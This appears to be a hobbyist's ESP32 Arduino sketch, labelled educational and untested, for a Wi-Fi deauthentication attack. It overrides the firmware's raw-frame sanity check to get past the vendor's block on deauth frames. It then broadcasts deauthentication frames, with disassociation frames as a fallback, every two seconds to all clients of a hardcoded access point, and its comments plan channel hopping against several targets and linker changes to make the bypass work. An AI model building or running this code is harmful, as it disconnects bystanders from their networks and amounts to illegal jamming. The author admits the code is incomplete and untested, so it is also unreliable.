/*
   Educational Example: Deauthentication Frame Transmission
   ----------------------------------------------------------
   This sketch demonstrates how a deauthentication packet might be constructed
   and transmitted using an ESP device (ESP32 in this example).

   DISCLAIMER: This code is for educational purposes only.
   Unauthorized deauthentication or jamming is illegal.
   V0.0.5 /UNTESTED/
*/

#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"  // Include the ESP WiFi API

typedef uint8_t MacAddr[6];

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
  return 0;
}
/*gotta use ghindra to reverse engineer and check out the function restriction for myself
 this basically makes sure that the sanity check restriction(preventing uncorrupted frames, deauth authentication and disassociation frames from being sent) to always return 0; basically saying yes! Im thinking this might become a problem while trouble shooting coz you know lets say you make a frame structure horribly something like a syntax error you wont know until you test it 

something like this may be a quick fix 
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t frame_len) {
    if (frame_len < 24) {  // 24 bytes is roughly roughlyyy the minimum frame header size
        printf("[ERROR] Frame too short!\n");
        return -1;  // Reject this frame
    }
    return 0; // Otherwise, allow it
}

*/
const uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x3A, 0x01,  //Type of frame & duration  (C0 FOR DEAUTH, A0 FOR DISSASSOCIATE)
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Target MAC (to be replaced), set to bradcast address as default
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // AP MAC (to be replaced)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (to be replaced)
    0x00, 0x00,  //Sequence number
    0x01, 0x00  //Reason  
};
/*
Experiment with Different Reason Codes (in little-endian architecture):
0x01 = Unspecified reason (most common)
0x04 = Disassociated due to inactivity
0x05 = Disassociated because AP is unable to handle all connected stations
0x08 = Deauthenticated because sending station is leaving (or has left)
*/

uint8_t buffer[sizeof(deauthPacket)];
uint16_t seqnum = 0;  

/*Handling the channel to send the frames in  ***mmh something smells fishhy about the change_channel function with the esp_err_t*** 
i like how its efficient by not just sending frames in all the 13 channels, but by listening to the active one
here comes in the issue of channel hopping especially when targeting multiple devices
currently the non overlapping ones are 1,6 and 11 but ill need to test while documenting if others in between do overlap
*/
esp_err_t change_channel(uint8_t channel) {
    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

esp_err_t raw(const uint8_t* packet, int32_t len) {
    return esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
}

esp_err_t deauth(const MacAddr target, const MacAddr ap, const MacAddr bssid, uint8_t reason, uint8_t channel) {
    esp_err_t res = change_channel(channel);
    if (res != ESP_OK) return res;

    memcpy(buffer, deauthPacket, sizeof(deauthPacket));

    memcpy(&buffer[4], target, 6); 
    memcpy(&buffer[10], ap, 6);    
    memcpy(&buffer[16], bssid, 6);  

    memcpy(&buffer[22], &seqnum, 2);
    buffer[24] = reason;

    seqnum++;

    res = raw(buffer, sizeof(deauthPacket));
    if (res == ESP_OK) return ESP_OK;

    buffer[0] = 0xA0; // Yah guessed it switch to dissassociate
    return raw(buffer, sizeof(deauthPacket));
}

void setup() {
    Serial.begin(115200);
    Serial.println("Deauth example - Educational Only");

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t ret = esp_wifi_init(&cfg);
    if (ret != ESP_OK) {
        Serial.printf("esp_wifi_init failed: %d\n", ret);
        while (true) { }
    }

    if ((ret = esp_wifi_set_mode(WIFI_MODE_STA)) != ESP_OK) {
        Serial.printf("esp_wifi_set_mode failed: %d\n", ret);
        while (true) { }
    }

    if ((ret = esp_wifi_start()) != ESP_OK) {
        Serial.printf("esp_wifi_start failed: %d\n", ret);
        while (true) { }
    }

    if ((ret = esp_wifi_set_promiscuous(true)) != ESP_OK) {
        Serial.printf("esp_wifi_set_promiscuous failed: %d\n", ret);
        while (true) { }
    }

    delay(1000);
}

void loop() {
    MacAddr target = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; 
    MacAddr ap = {0xcc, 0x20, 0x8c, 0x04, 0x74, 0xfe};      
    MacAddr bssid = {0xcc, 0x20, 0x8c, 0x04, 0x74, 0xfe};   

    esp_err_t res = deauth(target, ap, bssid, 1, 6);
    if (res == ESP_OK) {
        Serial.println("Deauth frame sent successfully.");
    } else {
        Serial.printf("Failed to send deauth frame. Error: %d\n", res);
    }

    delay(2000);
}
/*oh my conclusion: i gotta change the linker to acually make this work. 
Adding the function just wont help ill teachmyself the esp-idf compilation way to customise the linker 
be back when im done 

*/
